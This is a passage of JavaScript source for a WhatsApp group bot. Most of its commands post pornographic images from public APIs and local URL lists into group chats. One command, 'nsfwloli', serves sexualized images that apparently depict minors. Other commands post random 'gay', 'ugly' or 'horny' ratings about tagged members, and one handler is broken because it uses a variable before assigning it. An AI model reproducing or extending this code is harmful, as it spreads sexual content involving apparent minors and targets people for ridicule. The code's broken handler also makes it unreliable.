PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return PrexzyStickgroup()
if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return PrexzyStickgroup()
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return PrexzyStickgroup()
if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await PrexzyVilla.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/ahegao.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/ass.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/bdsm.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cum.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/ero.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/femdom.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/foot.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gangbang.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/glasses.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/hentai.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/jahy.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/manga.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/masturbation.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/neko.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/neko2.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/nsfwloli.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/orgy.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/panties.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/tentacles.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'thighs':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/thighs.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return PrexzyStickgroup()
	if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var prexzyresult = pickRandom(ahegaonsfw)
PrexzyVilla.sendMessage(m.chat, { caption: mess.success, image: { url: prexzyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return PrexzyStickgroup()
if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await PrexzyVilla.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return PrexzyStickgroup()
if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gifs.json'))
var prexzyresultx = pickRandom(ahegaonsfw)
    await PrexzyVilla.sendMessage(m.chat,{video:prexzyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return PrexzyStickgroup()
if (!AntiNsfw) return replygcprexzy(mess.nsfw)
await PrexzyStickWait()
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
PrexzyVilla.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await PrexzyVilla.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppprexzy = await getBuffer(ppuser)
PrexzyVilla.sendMessage(from, { image: ppprexzy, caption: profile, mentions: [bet]},{quoted:m})
break
case 'handsomecheck':
				if (!text) return replygcprexzy(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
PrexzyVilla.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygcprexzy(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
PrexzyVilla.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygcprexzy(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const prexzy =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = prexzy[Math.floor(Math.random() * prexzy.length)]
					PrexzyVilla.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return PrexzyStickgroup()
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
PrexzyVilla.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
PrexzyVilla.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
PrexzyVilla.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await PrexzyVilla.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await PrexzyVilla.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await PrexzyVilla.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await PrexzyVilla.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return PrexzyStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let prexzyresources = await Telesticker(args[0])
		await replygcprexzy(`Sending ${prexzyresources.length} stickers...`)
		if (m.isGroup && prexzyresources.length > 30) {
			await replygcprexzy('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < prexzyresources.length; i++) {
				PrexzyVilla.sendMessage(m.sender, { sticker: { url: prexzyresources[i].url }})
			}
		} else {
			for (let i = 0; i < prexzyresources.length; i++) {
				PrexzyVilla.sendMessage(m.chat, { sticker: { url: prexzyresources[i].url }})
			}
		}
	} else replygcprexzy(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext': {
    if (!q) return replygcprexzy(`Example: ${prefix + command} QUEEN NYX`);
    await PrexzyStickWait();
    const effects = {
        "shadow": "https://textpro.me/create-a-shadow-text-effect-online-982.html",
        "write": "https://textpro.me/create-a-cloud-text-effect-in-the-sky-online-1004.html",
        "romantic": "https://textpro.me/create-a-romantic-valentine-text-effect-1023.html",
        "burnpaper": "https://textpro.me/create-burn-paper-text-effect-online-981.html",
        "smoke": "https://textpro.me/create-smoke-text-effect-online-free-1014.html",
        "narutobanner": "https://textpro.me/create-naruto-banner-logo-online-free-1015.html",
        "love": "https://textpro.me/create-love-text-effect-online-1011.html",
        "undergrass": "https://textpro.me/create-grass-text-effect-online-982.html",
        "doublelove": "https://textpro.me/create-double-love-text-effect-online-1012.html",
        "coffecup": "https://textpro.me/create-coffee-cup-text-effect-online-1013.html",
        "underwaterocean": "https://textpro.me/create-underwater-ocean-text-effect-online-1010.html",
        "smokyneon": "https://textpro.me/create-a-smoky-neon-text-effect-online-1008.html",
        "starstext": "https://textpro.me/create-a-stars-text-effect-online-1007.html",
        "rainboweffect": "https://textpro.me/create-rainbow-text-effect-online-1006.html",
        "balloontext": "https://textpro.me/create-balloon-text-effect-online-1005.html",
        "metalliceffect": "https://textpro.me/create-metallic-text-effect-online-1003.html",
        "embroiderytext": "https://textpro.me/create-embroidery-text-effect-online-1002.html",
        "flamingtext": "https://textpro.me/create-flaming-fire-text-effect-online-940.html",
        "stonetext": "https://textpro.me/create-a-stone-text-effect-online-982.html",
        "writeart": "https://textpro.me/create-write-art-text-effect-online-1001.html",
        "summertext": "https://textpro.me/create-a-summer-text-effect-online-1000.html",
        "wolfmetaltext": "https://textpro.me/create-a-wolf-metal-text-effect-online-999.html",
        "nature3dtext": "https://textpro.me/create-nature-3d-text-effect-online-998.html",
        "rosestext": "https://textpro.me/create-roses-text-effect-online-997.html",
        "naturetypography": "https://textpro.me/create-nature-typography-text-effect-online-996.html",
        "quotesunder": "https://textpro.me/create-quotes-under-text-effect-online-995.html",
        "shinetext": "https://textpro.me/create-rainbow-shine-text-effect-online-994.html"
    };

    let link = effects[command];

    if (!link) return replygcprexzy("⚠️ Invalid effect! Try another one.");

    try {
        let imageUrl = await textpro.generate(link, q);

        PrexzyVilla.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `✅ *Effect Applied: ${command}*\n🖋 *Text:* ${q}`
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        replygcprexzy("❌ Failed to generate the text effect. Please try again later.");
    }
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replygcprexzy(`Example : ${prefix+command} PrexzyVilla`) 
await PrexzyStickWait()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
